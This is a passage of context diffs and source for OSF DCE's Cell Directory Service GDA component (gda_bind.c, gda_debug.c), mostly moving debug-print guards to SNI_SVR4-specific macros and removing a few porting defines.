! #ifdef GDA_BIND_DEBUG
      printf("       Tower[%d]: length=%d\n", cnt, len);
! #endif /* GDA_BIND_DEBUG */
      if ( get_binding_string ( tower_p, binding_p ))
      {
  	printf("        %s\n", string );
- --- 161,179 ----
    printf("    Towers:\n");
    tower_p = rp_p->rp_towers;
    cnt = GETL16(tower_p);	/* number of towers */
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
    printf("       %d towers\n", cnt);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
    for (/* cnt (as assigned above) */ ; cnt > 0; --cnt) 
    {
      len = GETL16(tower_p);      /* size of the tower */
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
      printf("       Tower[%d]: length=%d\n", cnt, len);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
      if ( get_binding_string ( tower_p, binding_p ))
      {
  	printf("        %s\n", string );
***************
*** 358,366 ****
    cds_Name_t attname;
    cds_Progress_t Progress;
    error_status_t commStatus;
- - #if defined(__haldce__) /* HaL@PORT-SOLARIS@19950116 */
- -   error_status_t rpc_status;
- - #endif /* __haldce__ */
    cds_status_t  dnsStatus;
    cds_RA_value_t value;
    unsigned char wholeset;
- --- 355,360 ----
***************
*** 542,546 ****
  #else
        printf("Rpc error Status %d\n", commStatus);
  #endif /* SNI_SVR4 */
- -   }
  }
- --- 536,539 ----
*********Here's the context diff for src/directory/cds/gda/gda_bind.c:*********

*** gda_bind.c	Mon May  8 10:02:23 1995
- --- /aus2g/dce/dce11_intl_sb/src/directory/cds/gda/gda_bind.c	Wed Aug 24 15:27:45 1994
***************
*** 440,456 ****
  };
  typedef struct map map;
  
- - #if defined(sunos) || defined(sysvabi) /* HaL@PORT-SUNOS@19941102 */
- -    /*
- -     * the following are found in /usr/include/arpa/nameser.h on some machines
- -     */
- - #define C_HESIOD        4               /* for Hesiod name server at MIT */
- - #ifndef C_HS
- - #define C_HS            C_HESIOD        /* for Hesiod name server at MIT */
- - #endif
- - #define T_TXT           16              /* text strings */
- - #endif /* sunos || sysvabi */
- - 
  map m_class[] = {
  	"in",		C_IN,
  	"chaos",	C_CHAOS,
- --- 426,431 ----
***************
*** 512,518 ****
  
  #define VC_MSG_SIZE_MAX		64 * ONE_K
  
! #ifdef GDA_BIND_DEBUG
  void fullname_print(cds_FullName_t* fname1_p)
  {
  	int i;
- --- 487,494 ----
  
  #define VC_MSG_SIZE_MAX		64 * ONE_K
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  void fullname_print(cds_FullName_t* fname1_p)
  {
  	int i;
***************
*** 520,526 ****
  		fprintf(stderr, "%c", fname1_p->fn_name[i]);
  	}
  
! #endif /* GDA_BIND_DEBUG */
  
  /*
   * values for bind_client_server below 
- --- 496,503 ----
  		fprintf(stderr, "%c", fname1_p->fn_name[i]);
  	}
  
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  
  /*
   * values for bind_client_server below 
***************
*** 829,838 ****
  
  	inq_error_string[0]='\0';
  
! #ifdef GDA_BIND_DEBUG
  	fprintf(stderr, "gdad: enter bindq_ext_to_int\n");
  	dump_message(answer, answer_len, stderr);
  #endif
  
  	if(!hp->qr)
  	{
- --- 806,817 ----
  
  	inq_error_string[0]='\0';
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  	fprintf(stderr, "gdad: enter bindq_ext_to_int\n");
  	dump_message(answer, answer_len, stderr);
  #endif
+ #endif
  
  	if(!hp->qr)
  	{
***************
*** 1380,1390 ****
  
                                        return(BINDQ_EXT_TO_INT_FIND_STRING_TXT);
  				}
! #ifdef GDA_BIND_DEBUG
  				fprintf(stderr, "gdad: NS uuid after conversion: ");
  				uuid_print(&rr->rr.ci.nsp_uuid);
  				fprintf(stderr, "\n");
  #endif
  
  				if(find_string_txt(&temp_cp, temp_st, &partial_len, &total_len) != OK)
  				{
- --- 1335,1347 ----
  
                                        return(BINDQ_EXT_TO_INT_FIND_STRING_TXT);
  				}
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  				fprintf(stderr, "gdad: NS uuid after conversion: ");
  				uuid_print(&rr->rr.ci.nsp_uuid);
  				fprintf(stderr, "\n");
  #endif
+ #endif
  
  				if(find_string_txt(&temp_cp, temp_st, &partial_len, &total_len) != OK)
  				{
***************
*** 1481,1491 ****
                                      return(BINDQ_EXT_TO_INT_FIND_STRING_TXT);
  				}
  
! #ifdef GDA_BIND_DEBUG
  				fprintf(stderr, "gdad: CH uuid after conversion: ");
  				uuid_print(&rr->rr.ci.ch_uuid);
  				fprintf(stderr, "\n");
  #endif
  				if(find_string_txt(&temp_cp, temp_st, &partial_len, &total_len) != OK)
  				{
                                        DCE_SVC_DEBUG((
- --- 1438,1450 ----
                                      return(BINDQ_EXT_TO_INT_FIND_STRING_TXT);
  				}
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  				fprintf(stderr, "gdad: CH uuid after conversion: ");
  				uuid_print(&rr->rr.ci.ch_uuid);
  				fprintf(stderr, "\n");
  #endif
+ #endif
  				if(find_string_txt(&temp_cp, temp_st, &partial_len, &total_len) != OK)
  				{
                                        DCE_SVC_DEBUG((
***************
*** 1596,1604 ****
            svc_c_debug2,
            " <bindq_ext_to_int: return(OK)"));
  
! #ifdef GDA_BIND_DEBUG
  fprintf(stderr, "gdad: exit bindq_ext_to_int\n");
  #endif
        return(OK);
  }
  
- --- 1555,1565 ----
            svc_c_debug2,
            " <bindq_ext_to_int: return(OK)"));
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  fprintf(stderr, "gdad: exit bindq_ext_to_int\n");
  #endif
+ #endif
        return(OK);
  }
  
***************
*** 1709,1719 ****
  
  			dce_svc_printf(CDS_S_GDA_RECVFROM_EB_MSG, (long)errno);
  		}
! #ifdef GDA_BIND_DEBUG
  		fprintf(stderr, "gdad: receiving bind response from ");
  		dump_address(&from, stderr);
  		fprintf(stderr, "\n");
! #endif /* GDA_BIND_DEBUG */
  		if((recv_answ = (list_t *)malloc(sizeof(list_t))) == NULL)
  		{
  		    dce_svc_printf(CDS_S_ALLOC_A_MSG);
- --- 1670,1682 ----
  
  			dce_svc_printf(CDS_S_GDA_RECVFROM_EB_MSG, (long)errno);
  		}
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  		fprintf(stderr, "gdad: receiving bind response from ");
  		dump_address(&from, stderr);
  		fprintf(stderr, "\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  		if((recv_answ = (list_t *)malloc(sizeof(list_t))) == NULL)
  		{
  		    dce_svc_printf(CDS_S_ALLOC_A_MSG);
***************
*** 1743,1752 ****
  		  continue;
  	      }	
  
! #ifdef GDA_BIND_DEBUG
  	      fprintf(stderr, "recv_bind(): post bindq_ext_to_int:dumping recv_answ:\n");
  	      dump_list(recv_answ, stderr);
! #endif /* GDA_BIND_DEBUG */
  	      if((rr_head = (rr_el_t *)l_first_nl(recv_answ)) == NULL ||
  		 RR_HEAD->tag_rr != e_header)
  	      {
- --- 1706,1717 ----
  		  continue;
  	      }	
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  	      fprintf(stderr, "recv_bind(): post bindq_ext_to_int:dumping recv_answ:\n");
  	      dump_list(recv_answ, stderr);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  	      if((rr_head = (rr_el_t *)l_first_nl(recv_answ)) == NULL ||
  		 RR_HEAD->tag_rr != e_header)
  	      {
***************
*** 1804,1822 ****
  			ques > (question_el_t *)NULL;
  			ques = (question_el_t *)l_next((element_t *)ques))
  		{
! #ifdef GDA_BIND_DEBUG
  			fprintf(stderr, "gdad: recv_bind(); comparing question \"");
  			fullname_print(&QUES->unresolved_in_q);
  			fprintf(stderr, "\" with answer \"");
  			fullname_print(&RR_QUES->dname_rr);
  			fprintf(stderr, "\"\n");
! #endif /* GDA_BIND_DEBUG */
  			if((status = fullname_prefix(&RR_QUES->dname_rr,
  				&QUES->unresolved_in_q))  >= FIRST_PREFIX)
  			{
! #ifdef GDA_BIND_DEBUG
  			      fprintf(stderr, "recv_bind(): in matchloop: status = %d\n", status);
! #endif /* GDA_BIND_DEBUG */
                                DCE_SVC_DEBUG((
                                    cds__svc_handle,
                                    cds_svc_gda,
- --- 1769,1791 ----
  			ques > (question_el_t *)NULL;
  			ques = (question_el_t *)l_next((element_t *)ques))
  		{
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  			fprintf(stderr, "gdad: recv_bind(); comparing question \"");
  			fullname_print(&QUES->unresolved_in_q);
  			fprintf(stderr, "\" with answer \"");
  			fullname_print(&RR_QUES->dname_rr);
  			fprintf(stderr, "\"\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  			if((status = fullname_prefix(&RR_QUES->dname_rr,
  				&QUES->unresolved_in_q))  >= FIRST_PREFIX)
  			{
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  			      fprintf(stderr, "recv_bind(): in matchloop: status = %d\n", status);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
                                DCE_SVC_DEBUG((
                                    cds__svc_handle,
                                    cds_svc_gda,
***************
*** 1849,1857 ****
  			}
  		}
  
! #ifdef GDA_BIND_DEBUG
  	      fprintf(stderr, "recv_bind(): after matchloop: found = %d\n", found);
! #endif /* GDA_BIND_DEBUG */
                DCE_SVC_DEBUG((
                    cds__svc_handle,
                    cds_svc_gda,
- --- 1818,1828 ----
  			}
  		}
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  	      fprintf(stderr, "recv_bind(): after matchloop: found = %d\n", found);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
                DCE_SVC_DEBUG((
                    cds__svc_handle,
                    cds_svc_gda,
***************
*** 1884,1892 ****
  
  		if(!found)
  		{
! #ifdef GDA_BIND_DEBUG
  		      fprintf(stderr, "recv_bind(): Error: Answer received to non-existent question\n");
! #endif /* GDA_BIND_DEBUG */
                        DCE_SVC_DEBUG((
                            cds__svc_handle,
                            cds_svc_gda,
- --- 1855,1865 ----
  
  		if(!found)
  		{
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  		      fprintf(stderr, "recv_bind(): Error: Answer received to non-existent question\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
                        DCE_SVC_DEBUG((
                            cds__svc_handle,
                            cds_svc_gda,
***************
*** 1906,1914 ****
  			continue;
  		}
  
! #ifdef GDA_BIND_DEBUG
  	      fprintf(stderr, "recv_bind(): Before mutex lock\n");
! #endif /* GDA_BIND_DEBUG */
                DCE_SVC_DEBUG((
                    cds__svc_handle,
                    cds_svc_gda,
- --- 1879,1889 ----
  			continue;
  		}
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  	      fprintf(stderr, "recv_bind(): Before mutex lock\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
                DCE_SVC_DEBUG((
                    cds__svc_handle,
                    cds_svc_gda,
***************
*** 1939,1947 ****
  		    continue;
  		  }
  
! #ifdef GDA_BIND_DEBUG
  	      fprintf(stderr, "recv_bind(): After mutex lock\n");
! #endif /* GDA_BIND_DEBUG */
                DCE_SVC_DEBUG((
                    cds__svc_handle,
                    cds_svc_gda,
- --- 1914,1924 ----
  		    continue;
  		  }
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  	      fprintf(stderr, "recv_bind(): After mutex lock\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
                DCE_SVC_DEBUG((
                    cds__svc_handle,
                    cds_svc_gda,
***************
*** 2720,2737 ****
  			nameser->rr.adns.auth = 1;
  			nameser->rr.adns.used = 0;
  			nameser->rr.adns.path = DATAGRAM;
! #ifdef GDA_BIND_DEBUG 
  			fprintf(stderr,"gdad: init_server: adding nameserver \"");
- - 			/* fullname_print(nameser->dname_rr);
- - 			fprintf(stderr,"\"");
- - 			dump_address(nameser->rr.adns.mach_addr,stderr); */
- - 			/*
  			fullname_print(&AD->dname_rr);
  			fprintf(stderr,"\"");
  			dump_address(&AD->rr.ad.mach_addr,stderr);
- - 			*/
  			fprintf(stderr,"\n");
  #endif
  
  			l_insert_nl((char **)&nameser, &nameser_list,
  				(element_t *)NULL);
- --- 2697,2711 ----
  			nameser->rr.adns.auth = 1;
  			nameser->rr.adns.used = 0;
  			nameser->rr.adns.path = DATAGRAM;
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  			fprintf(stderr,"gdad: init_server: adding nameserver \"");
  			fullname_print(&AD->dname_rr);
  			fprintf(stderr,"\"");
  			dump_address(&AD->rr.ad.mach_addr,stderr);
  			fprintf(stderr,"\n");
  #endif
+ #endif
  
  			l_insert_nl((char **)&nameser, &nameser_list,
  				(element_t *)NULL);
***************
*** 2751,2756 ****
- --- 2725,2731 ----
  static int 
  init_server (void)
  {
+     
  #ifdef 	AD
  #undef	AD
  #endif
***************
*** 2759,2765 ****
  #undef	NS
  #endif
  #define	NS	LIST_REF(rr_el_t, ns)
- -     
  	char	domain[MAXDNAME];
  	char	origin[MAXDNAME];
  	register FILE 	*fp;
- --- 2734,2739 ----
***************
*** 3124,3132 ****
            cds_svc_gda,
            svc_c_debug2,
            " >init_bind"));
! #ifdef GDA_BIND_DEBUG
  fprintf(stderr, "gdad: enter init_bind\n");
  #endif
  
  	if(pthread_mutex_init(&id_mutex, pthread_mutexattr_default))
  	{
- --- 3098,3108 ----
            cds_svc_gda,
            svc_c_debug2,
            " >init_bind"));
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  fprintf(stderr, "gdad: enter init_bind\n");
  #endif
+ #endif
  
  	if(pthread_mutex_init(&id_mutex, pthread_mutexattr_default))
  	{
***************
*** 4741,4752 ****
  				query_id;
  			element->cd_q.bind.who[element->cd_q.bind.num_who].ad_ns = best;
  			element->cd_q.bind.num_who = element->cd_q.bind.num_who + 1;
! #ifdef GDA_BIND_DEBUG
  			fprintf(stderr, "gdad: sending bind query to ");
  			dump_address(&BEST->rr.adns.mach_addr, stderr);
  			fprintf(stderr, "\n");
  			dump_message(buf, length, stderr);
! #endif /* GDA_BIND_DEBUG */
  			if (sendto(bind_dg_sock, buf, length, 0,
  				(struct sockaddr *)&BEST->rr.adns.mach_addr,
  				sizeof(struct sockaddr_in)) < 0)
- --- 4684,4697 ----
  				query_id;
  			element->cd_q.bind.who[element->cd_q.bind.num_who].ad_ns = best;
  			element->cd_q.bind.num_who = element->cd_q.bind.num_who + 1;
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  			fprintf(stderr, "gdad: sending bind query to ");
  			dump_address(&BEST->rr.adns.mach_addr, stderr);
  			fprintf(stderr, "\n");
  			dump_message(buf, length, stderr);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  			if (sendto(bind_dg_sock, buf, length, 0,
  				(struct sockaddr *)&BEST->rr.adns.mach_addr,
  				sizeof(struct sockaddr_in)) < 0)
***************
*** 4800,4814 ****
  		dealloc answer
  */
  
! #ifdef GDA_BIND_DEBUG
  		fprintf(stderr, "bind_process(): About to look at answers\n");
! #endif /* GDA_BIND_DEBUG */
  		if(element->cd_q.bind.answer == (list_t *)NULL ||
  			(head = (rr_el_t *)l_first_nl(element->cd_q.bind.answer)) == NULL)
  		{
! #ifdef GDA_BIND_DEBUG
  		      fprintf(stderr, "bind_process(): Error: bind.answer list null\n");
! #endif /* GDA_BIND_DEBUG */
                        DCE_SVC_DEBUG((
                            cds__svc_handle,
                            cds_svc_gda,
- --- 4745,4763 ----
  		dealloc answer
  */
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  		fprintf(stderr, "bind_process(): About to look at answers\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  		if(element->cd_q.bind.answer == (list_t *)NULL ||
  			(head = (rr_el_t *)l_first_nl(element->cd_q.bind.answer)) == NULL)
  		{
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  		      fprintf(stderr, "bind_process(): Error: bind.answer list null\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
                        DCE_SVC_DEBUG((
                            cds__svc_handle,
                            cds_svc_gda,
***************
*** 4821,4829 ****
  		{
  			if(HEAD->tag_rr != e_header)
  			{
! #ifdef GDA_BIND_DEBUG
  			    fprintf(stderr, "bind_process(): Error: header not on front of bind.answer list\n");
! #endif /* GDA_BIND_DEBUG */
  			    DCE_SVC_DEBUG((
                                  cds__svc_handle,
                                  cds_svc_gda,
- --- 4770,4780 ----
  		{
  			if(HEAD->tag_rr != e_header)
  			{
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  			    fprintf(stderr, "bind_process(): Error: header not on front of bind.answer list\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  			    DCE_SVC_DEBUG((
                                  cds__svc_handle,
                                  cds_svc_gda,
***************
*** 4897,4905 ****
  			}
  		}
  
! #ifdef GDA_BIND_DEBUG
  		fprintf(stderr, "bind_process(): About to look at head list\n");
! #endif /* GDA_BIND_DEBUG */
  	      for(truncated = 0, rr = (rr_el_t *)l_next_nl((element_t *)head);
  		  rr > (rr_el_t *)NULL;
  		  rr = (rr_el_t *)l_next_nl((element_t *)head))
- --- 4848,4858 ----
  			}
  		}
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  		fprintf(stderr, "bind_process(): About to look at head list\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  	      for(truncated = 0, rr = (rr_el_t *)l_next_nl((element_t *)head);
  		  rr > (rr_el_t *)NULL;
  		  rr = (rr_el_t *)l_next_nl((element_t *)head))
***************
*** 4909,4917 ****
  		    
  		    if(!truncated)
  			{
! #ifdef GDA_BIND_DEBUG
                          fprintf(stderr, "bind_process(): in trucate test loop;tag_rr=%d\n", RR->tag_rr);
! #endif /* GDA_BIND_DEBUG */
  			switch (RR->tag_rr) {
  		       case e_addr:
  			  break;
- --- 4862,4872 ----
  		    
  		    if(!truncated)
  			{
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
                          fprintf(stderr, "bind_process(): in trucate test loop;tag_rr=%d\n", RR->tag_rr);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  			switch (RR->tag_rr) {
  		       case e_addr:
  			  break;
***************
*** 4920,4928 ****
  			      rr1 > (rr_el_t *)NULL;
  			      rr1 = (rr_el_t *)l_next_nl((element_t *)rr1))
  			      {
! #ifdef GDA_BIND_DEBUG
  				fprintf(stderr, "bind_process(): in e_nameserver;tag_rr=%d\n", RR1->tag_rr);
! #endif /* GDA_BIND_DEBUG */
  				switch (RR1->tag_rr) {
  				case e_addr:
  				  if(fullname_cmp(&RR->rr.ns.mach_name, &RR1->dname_rr) == EQUAL)
- --- 4875,4885 ----
  			      rr1 > (rr_el_t *)NULL;
  			      rr1 = (rr_el_t *)l_next_nl((element_t *)rr1))
  			      {
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  				fprintf(stderr, "bind_process(): in e_nameserver;tag_rr=%d\n", RR1->tag_rr);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  				switch (RR1->tag_rr) {
  				case e_addr:
  				  if(fullname_cmp(&RR->rr.ns.mach_name, &RR1->dname_rr) == EQUAL)
***************
*** 4988,5005 ****
  			      rr1 > (rr_el_t *)NULL;
  			      rr1 = (rr_el_t *)l_next_nl((element_t *)rr1))
  			      {
! #ifdef GDA_BIND_DEBUG
  				fprintf(stderr, "bind_process(): in e_cds_cell_info_txt;tag_rr=%d\n", RR1->tag_rr);
! #endif /* GDA_BIND_DEBUG */
  				switch (RR1->tag_rr) {
  				      case e_addr:
! #ifdef GDA_BIND_DEBUG
  				  fprintf(stderr, "bind_process(): in e_cds_cell_info_txt/e_addr: n1=\"");
  				  fullname_print(&RR->rr.ci.mach_name);
  				  fprintf(stderr,"\";n2=\"");
  				  fullname_print(&RR1->dname_rr);
  				  fprintf(stderr,"\"\n");
! #endif /* GDA_BIND_DEBUG */
  				  if(fullname_cmp(&RR->rr.ci.mach_name, &RR1->dname_rr)
  				     == EQUAL)
  				      {
- --- 4945,4966 ----
  			      rr1 > (rr_el_t *)NULL;
  			      rr1 = (rr_el_t *)l_next_nl((element_t *)rr1))
  			      {
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  				fprintf(stderr, "bind_process(): in e_cds_cell_info_txt;tag_rr=%d\n", RR1->tag_rr);
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  				switch (RR1->tag_rr) {
  				      case e_addr:
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  				  fprintf(stderr, "bind_process(): in e_cds_cell_info_txt/e_addr: n1=\"");
  				  fullname_print(&RR->rr.ci.mach_name);
  				  fprintf(stderr,"\";n2=\"");
  				  fullname_print(&RR1->dname_rr);
  				  fprintf(stderr,"\"\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  				  if(fullname_cmp(&RR->rr.ci.mach_name, &RR1->dname_rr)
  				     == EQUAL)
  				      {
***************
*** 5047,5055 ****
  			  
  			  if(ci != NULL && ci->rr.ci.num_addr > 0)
  			      {
! #ifdef GDA_BIND_DEBUG
  				fprintf(stderr, "bind_process(): Truncation free\n");
! #endif /* GDA_BIND_DEBUG */
  				l_insert_nl((char **)&ci, 
  					    &element->cd_q.bind.answers,
  					    (element_t *)NULL);
- --- 5008,5018 ----
  			  
  			  if(ci != NULL && ci->rr.ci.num_addr > 0)
  			      {
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  				fprintf(stderr, "bind_process(): Truncation free\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  				l_insert_nl((char **)&ci, 
  					    &element->cd_q.bind.answers,
  					    (element_t *)NULL);
***************
*** 5056,5064 ****
  			      }
  			  else
  			      {
! #ifdef GDA_BIND_DEBUG
  				fprintf(stderr, "bind_process(): Truncation found\n");
! #endif /* GDA_BIND_DEBUG */
  				/* The message might have been truncated without having
  				   the tc bit set.  The doaddinfo routine may not have
  				   been able to add all of the data that could have
- --- 5019,5029 ----
  			      }
  			  else
  			      {
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  				fprintf(stderr, "bind_process(): Truncation found\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  				/* The message might have been truncated without having
  				   the tc bit set.  The doaddinfo routine may not have
  				   been able to add all of the data that could have
***************
*** 5148,5166 ****
  				}
  				else
  				{
! #ifdef GDA_BIND_DEBUG
  					fprintf(stderr, "bind_process(): seemingly, a match was found; elem:");
  					fullname_print(&element->unresolved_in_q);
  					fprintf(stderr, "\"\n");
  					fprintf(stderr,"NS uuid: ");
  					uuid_print(&RR->rr.ci.nsp_uuid);
- - 					fprintf(stderr, "\nCH name: ");
- - 			                fullname_print(&RR->rr.ci.ch_name);
  					fprintf(stderr, "\nCH uuid: ");
  					uuid_print(&RR->rr.ci.ch_uuid);
  					fprintf(stderr, "\n");
  
! #endif /* GDA_BIND_DEBUG */
  					found = 1;
  					answ = RR;
  					num_memslots = 0;
- --- 5113,5131 ----
  				}
  				else
  				{
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  					fprintf(stderr, "bind_process(): seemingly, a match was found; elem:");
  					fullname_print(&element->unresolved_in_q);
  					fprintf(stderr, "\"\n");
  					fprintf(stderr,"NS uuid: ");
  					uuid_print(&RR->rr.ci.nsp_uuid);
  					fprintf(stderr, "\nCH uuid: ");
  					uuid_print(&RR->rr.ci.ch_uuid);
  					fprintf(stderr, "\n");
  
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  					found = 1;
  					answ = RR;
  					num_memslots = 0;
***************
*** 5206,5214 ****
                            svc_c_debug5,
                            "bind_process: answer was found"));
  
! #ifdef GDA_BIND_DEBUG
  		      fprintf(stderr, "bind_process(): an answer was found\n");
! #endif /* GDA_BIND_DEBUG */
  			/*
  			 * an answer was found, format return parameters 
  			 */
- --- 5171,5181 ----
                            svc_c_debug5,
                            "bind_process: answer was found"));
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  		      fprintf(stderr, "bind_process(): an answer was found\n");
! #endif /* SNI_INTENSE_GDA_DEBUG */
! #endif /* SNI_SVR4 */
  			/*
  			 * an answer was found, format return parameters 
  			 */
***************
*** 5386,5394 ****
  			element->unresolved_out_q.fn_length += cds_suffix.fn_length;
  		}
  
! #ifdef GDA_BIND_DEBUG
  fprintf(stderr, "gdad: Error: bind_process:DNS_UNKNOWNENTRY\n");
  #endif
                DCE_SVC_DEBUG((
                    cds__svc_handle,
                    cds_svc_gda,
- --- 5353,5363 ----
  			element->unresolved_out_q.fn_length += cds_suffix.fn_length;
  		}
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  fprintf(stderr, "gdad: Error: bind_process:DNS_UNKNOWNENTRY\n");
  #endif
+ #endif
                DCE_SVC_DEBUG((
                    cds__svc_handle,
                    cds_svc_gda,
***************
*** 5406,5413 ****
  			element->unresolved_out_q.fn_length += cds_suffix.fn_length;
  		}
  
! #ifdef GDA_BIND_DEBUG
  fprintf(stderr, "gdad: Error: bind_process:DNS_NAMESERVERERRORS\n");
  #endif
                DCE_SVC_DEBUG((
                    cds__svc_handle,
- --- 5375,5384 ----
  			element->unresolved_out_q.fn_length += cds_suffix.fn_length;
  		}
  
! #ifdef SNI_SVR4
! #ifdef SNI_INTENSE_GDA_DEBUG
  fprintf(stderr, "gdad: Error: bind_process:DNS_NAMESERVERERRORS\n");
+ #endif
  #endif
                DCE_SVC_DEBUG((
                    cds__svc_handle,

**********Here's the source for src/directory/cds/gda/gda_debug.c:************

/*
 * @OSF_COPYRIGHT@
 * COPYRIGHT NOTICE
 * Copyright (c) 1990, 1991, 1992, 1993, 1994 Open Software Foundation, Inc.
 * ALL RIGHTS RESERVED (DCE).  See the file named COPYRIGHT.DCE for
 * the full copyright text.
 */
/*
 * HISTORY
 * $Log:	c012983,v $
# Revision 1.1  95/08/01  17:59:55  root
# new CR
# 
 * Revision 1.1.6.5  1994/08/03  19:01:36  mccann
 * 	include file cleanup
 * 	[1994/07/19  17:53:51  mccann]
 *
 * Revision 1.1.6.4  1994/06/23  18:30:01  mccann
 * 	sams cleanup drop1
 * 	[1994/06/22  19:27:31  mccann]
 * 
 * Revision 1.1.6.3  1994/06/09  18:38:03  devsrc
 * 	cr10871 - expand copyright
 * 	[1994/06/09  18:10:12  devsrc]
 * 
 * Revision 1.1.6.2  1994/05/12  21:11:13  peckham
 * 	Change _DNS_DEFAULT_STACK_ reference to _CDS_DEFAULT_STACK_
 * 	[1994/05/12  19:14:52  peckham]
 * 
 * Revision 1.1.6.1  1994/03/12  22:01:35  peckham
 * 	DEC serviceability and i18n drop
 * 	[1994/03/12  14:08:52  peckham]
 * 
 * Revision 1.1.4.3  1992/12/30  13:27:05  zeliff
 * 	Embedding copyright notices
 * 	[1992/12/29  22:43:38  zeliff]
 * 
 * Revision 1.1.4.2  1992/09/29  19:12:31  devsrc
 * 	SNI/SVR4 merge.  OT 5373
 * 	[1992/09/11  15:12:06  weisman]
 * 
 * Revision 1.1  1992/01/19  15:24:20  devrcs
 * 	Initial revision
 * 
 * $EndLog$
 */
/*
 * COPYRIGHT (c) DIGITAL EQUIPMENT CORPORATION 1991-1994. ALL RIGHTS RESERVED.
 *
 * THIS SOFTWARE IS FURNISHED UNDER A LICENSE AND MAY BE USED AND  COPIED
 * ONLY  IN  ACCORDANCE  WITH  THE  TERMS  OF  SUCH  LICENSE AND WITH THE
 * INCLUSION OF THE ABOVE COPYRIGHT NOTICE.  THIS SOFTWARE OR  ANY  OTHER
 * COPIES  THEREOF MAY NOT BE PROVIDED OR OTHERWISE MADE AVAILABLE TO ANY
 * OTHER PERSON.  NO TITLE TO AND OWNERSHIP OF  THE  SOFTWARE  IS  HEREBY
 * TRANSFERRED.
 *
 * THE INFORMATION IN THIS SOFTWARE IS SUBJECT TO CHANGE  WITHOUT  NOTICE
 * AND  SHOULD  NOT  BE  CONSTRUED  AS  A COMMITMENT BY DIGITAL EQUIPMENT
 * CORPORATION.
 *
 * DIGITAL ASSUMES NO RESPONSIBILITY FOR THE USE OR  RELIABILITY  OF  ITS
 * SOFTWARE ON EQUIPMENT THAT IS NOT SUPPLIED BY DIGITAL.
 */

#include <gda.h>
#include <dce/cds_basic_types.h>

#if defined(DCE_CDS_DEBUG)

#include <dce/assert.h>
#include <gda_main.h>
#include <sys/time.h>
#include <dce/utc.h>
#include <errno.h>

/*
 * local prototypes
 */
static void
print_memstat(
	      utc_t *);

static void 
memstat (
	 void);


